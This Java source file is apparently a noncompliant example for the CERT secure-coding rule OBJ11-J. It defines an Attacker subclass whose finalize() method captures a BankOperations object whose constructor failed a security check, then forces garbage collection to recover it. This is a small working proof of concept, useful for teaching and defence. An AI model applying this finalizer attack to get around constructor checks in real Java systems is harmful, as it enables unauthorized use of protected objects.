package rules.obj11j.noncompliant;

/** 
 * A subclass that demonstrates a finalizer attack
 * 
 * 1) The attacker creates an Attacker object.
 * 2) the bankOperations constructor fails the security check
 * 3) even though the constructor fails, the object still exists in memory
 * 4) the object becomes available for garbage collection
 * 5) The finalize() method saves the object in stolenInstance
 * 6) the attacker can then use the recovered object without passing the oiginal security check
 */
class Attacker extends BankOperations {

    // The stolen instance of the BankOperations object
    private static Attacker stolenInstance;

    /**
     * Calls the BankOperations constructor
     * 
     * The constructor throws a SecurityException because verification
     */
    public Attacker() {
        super(); 
    }

    /**    
     * Saves the object before it is removed in memory
     */
    @Override
    protected void finalize() {
        stolenInstance = this;
    }

    /**
     * Attempts to recover the object after the constructor fails
     * @return the recovered object, or null if the attack fails
     */
    public static Attacker getStolenInstance() {
        try {
            // Attempt to create an Attacker object, which will fail the security check
            new Attacker();
        } catch (SecurityException e) {
            // The constructor failed, but the object may still be in memory and available for garbage collection
        }

        System.gc();

        // Wait for a short time to allow the garbage collector to run and finalize the object
        try {
            Thread.sleep(100);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        // Return the stolen instance if it was successfully recovered
        return stolenInstance;
    }
}
